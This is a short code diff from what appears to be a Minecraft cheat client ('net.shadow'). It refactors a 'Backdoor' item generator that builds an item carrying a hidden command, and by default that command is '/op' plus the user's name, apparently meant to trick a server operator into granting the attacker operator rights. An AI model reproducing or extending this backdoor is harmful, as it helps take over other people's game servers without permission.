@@ -6,7 +6,6 @@ package net.shadow.feature.items.impl;
 
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
-import net.shadow.client.ShadowMain;
 import net.shadow.feature.items.Item;
 import net.shadow.feature.items.Option;
 import net.shadow.client.helper.nbt.NbtGroup;
@@ -33,6 +32,7 @@ public class Backdoor extends Item {
 
     @Override
     public ItemStack generate() {
+        client = MinecraftClient.getInstance();
         String titleStr = title.getValue();
         String contentStr = content.getValue();
         String cmdStr = command.getValue();
@@ -42,7 +42,7 @@ public class Backdoor extends Item {
         if (contentStr.equals("generateForMe")) {
             contentStr = getRandomContent();
         }
-        String author = ShadowMain.client.getSession().getProfile().getName();
+        String author = client.getSession().getProfile().getName();
         if (cmdStr.equals("generateForMe")) {
             cmdStr = "/op " + author;
         }
